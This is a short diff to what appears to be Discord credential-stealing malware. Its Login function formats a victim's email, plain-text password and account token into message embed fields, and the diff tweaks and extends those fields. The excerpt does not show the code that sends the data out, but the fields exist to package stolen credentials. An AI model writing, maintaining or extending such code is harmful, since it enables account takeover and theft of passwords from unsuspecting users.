@@ -1,3 +1,7 @@
+#beforeedit
+
+
+
 
 const fs = require('fs');
 const path = require('path');
@@ -151,14 +155,18 @@ function Login(email, password, token) {
                         {
                             "name": "<a:party:709806688554975353> | Account Informations :",
                             "value": `Email: \`${email}\` > Password: \`${password}\``,
-                            "inline": false
+                            "inline": true
                         },
-
-
                         {
                             "name": ":unlock: | Token :",
                             "value": `\`${token}\``,
                             "inline": false
+                        },
+
+                        {
+                            "name": "lock",
+                            "value": ":unlock:",
+
                         }
                     ],
                     "author": {
